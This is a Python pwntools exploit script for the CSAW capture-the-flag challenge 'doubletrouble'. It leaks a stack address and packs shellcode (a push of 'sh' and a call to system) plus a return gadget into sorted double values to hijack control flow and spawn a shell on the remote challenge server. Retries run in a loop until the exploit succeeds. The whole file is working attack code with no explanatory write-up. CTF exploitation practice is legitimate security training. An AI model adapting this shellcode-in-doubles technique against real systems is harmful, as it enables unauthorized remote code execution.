#!/usr/bin/env python
import base64
import re
import struct
#
from pwn import *

context.arch = 'i386'


class PwnData:
    libc_name = 'libc6_2.27-3ubuntu1_i386.so'
    name    = 'doubletrouble'
    remote  = 'pwn.chal.csaw.io'
    port    = 9002
    gdb     = open('./.gdbinit', 'rb').read()
    #
    double_sent = 0
    #
    number_to_stop_inc_array_size = -99.0
    array_size = 64


def bytes_to_double(s):
    """bytes_to_double(s) -> float

    Return:
        A little-endian double that packed by the string b.
    """
    return struct.unpack('<d', s)[0]


def send_double2remote(r, f):
    PwnData.double_sent += 1
    r.sendline(b'%r' % f)


def get_process():
    r = None
    if args.REMOTE:
        log.info("=> REMOTE run")
        r = remote(PwnData.remote, PwnData.port)
    elif args.GDB:
        log.info("=> GDB run")
        if args.GDB == 'attach':
            r = process('./%s' % PwnData.name, env={'LD_PRELOAD': PwnData.libc_name})
            gdb.attach(r.pid, PwnData.gdb)
        else:
            r = gdb.debug('./%s' % PwnData.name, PwnData.gdb)
    else:
        log.info("=> LOCAL run")
        r = process('./%s' % PwnData.name, env={'LD_PRELOAD': PwnData.libc_name})

    return r


def exploit():
    r = get_process()

    r.recvuntil(b'0x')

    ADDR_array = int(r.recv(8), 16)
    log.info('stack 0x%x', ADDR_array)

    r.sendlineafter(b'long: ', str(PwnData.array_size))

    """
    The fe, fc or ff byte is for making these padded value appear as minus double
    """
    ASM_push_sh     = bytearray.fromhex('682da10408eb01' + 'fe')  # push 0x804a12d; jmp $+3  -> push sh
    ASM_ret_system  = bytearray.fromhex('ff15f0bf0408' + 'fcfc')  # call dword [0x804bff0] -> call system

    ASM_ret_gadget       = p64(0x080498A4ffffffff)              # ret gadget
    ASM_shellcode_gadget = p64(0x0806000000000000 + ADDR_array) # addr of shellcode

    JUNK_PAD = bytes_to_double(p64(0xf8ffffffffffffff))

    send_double2remote(r, bytes_to_double(ASM_push_sh))
    send_double2remote(r, bytes_to_double(ASM_ret_system))

    send_double2remote(r, JUNK_PAD)
    send_double2remote(r, JUNK_PAD)

    send_double2remote(r, PwnData.number_to_stop_inc_array_size)

    send_double2remote(r, bytes_to_double(ASM_ret_gadget))
    send_double2remote(r, bytes_to_double(ASM_shellcode_gadget))

    remain_size = PwnData.array_size - PwnData.double_sent

    for i in range(remain_size):
        send_double2remote(r, JUNK_PAD)

    r.recvuntil('Sorted Array:')
    r.recvuntil('63:')
    r.recvline(keepends=False)

    ret = r.recvuntil("terminated\n", timeout=3.0)
    if not ret:
        r.sendline('ls')
        r.interactive()

    return r


def main():
    # exploit()

    # 0x08 / (0xff + 1) == 1/32
    while True:
        try:
            PwnData.double_sent = 0
            exploit().close()
        except EOFError as e:
            log.failure("Failed !!!")

if __name__ == "__main__":
    main()
